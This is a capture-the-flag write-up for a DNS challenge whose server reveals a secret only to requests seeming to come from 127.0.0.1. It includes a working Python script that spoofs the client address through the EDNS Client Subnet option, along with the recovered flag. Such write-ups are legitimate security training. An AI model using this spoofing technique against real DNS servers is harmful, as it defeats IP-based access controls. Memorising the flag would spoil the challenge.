# DNS

Solved by: @vicevirus

## Question:
This DNS server reveals a secret to a special IP. Can you make it think you’re connecting from 127.0.0.1?

`dig TXT flag @129.153.36.153`

## Solution:
bypass using `ECS` (EDNS Client Subnet) params.  It's almost like `X-Forwarded-For` but for DNS

```
import dns.message
import dns.query
import dns.edns
import dns.exception

# Define the DNS server and query parameters
dns_server = '129.153.36.153'
query_name = 'flag'
query_type = 'TXT'

# Create the DNS query for the TXT record 'flag'
query = dns.message.make_query(query_name, query_type)

# Define ECS parameters
ecs_address = '127.0.0.1'
source_prefix = 32  # Full IP address
scope_prefix = 0    # Typically 0 unless specifying a more restrictive scope

# Construct the ECS option using positional arguments
ecs_option = dns.edns.ECSOption(ecs_address, source_prefix, scope_prefix)

# Add the ECS option to the EDNS0 options
query.use_edns(options=[ecs_option])

try:
    # Send the DNS query over UDP
    response = dns.query.udp(query, dns_server, timeout=5)

    # Check and print the response
    if response.answer:
        for answer in response.answer:
            print(answer.to_text())
    else:
        print("No answer received or the server did not provide the flag.")
except dns.exception.Timeout:
    print("The DNS query timed out. Please check your network connection and try again.")
except Exception as e:
    print(f"An error occurred: {e}")
    ```

**Flag:`UDCTF{sp00fing_5ucc3ss_127_0_0_1_f728bf}`** 
